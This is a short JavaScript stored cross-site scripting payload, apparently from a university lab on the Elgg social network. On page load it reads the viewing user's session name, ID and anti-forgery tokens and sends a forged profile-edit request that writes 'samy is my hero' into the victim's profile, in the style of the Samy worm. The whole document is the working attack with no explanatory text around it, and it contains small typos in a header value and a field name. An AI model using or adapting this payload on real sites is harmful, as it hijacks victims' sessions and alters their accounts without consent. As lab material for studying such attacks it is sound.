<script type="text/javascript">
	window.onload = function(){
	var userName=elgg.session.user.name;
	var guid=elgg.session.user.guid;
	var ts=elgg.security.token.__elgg_ts;
	var token=elgg.security.token.__elgg_token;
	var updateMessage = "samy is my hero" ;
	var content="__elgg_token=" +token+"&__elgg_ts="+ts+"&name=" +userName+"&description=&accesslevel[description]=2&briefdescription="+updateMessage+"&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&acesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid="+guid;
	var sendurl="http://www.xsslabelgg.com/action/profile/edit";
	var samyGuid = 47;
	if(guid!=samyGuid){
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST", sendurl, true);
		Ajax.setRequestHeader("Content-Type" ,"application/x-www-forp-urlencoded");
		Ajax.send(content);
	}
}
</script>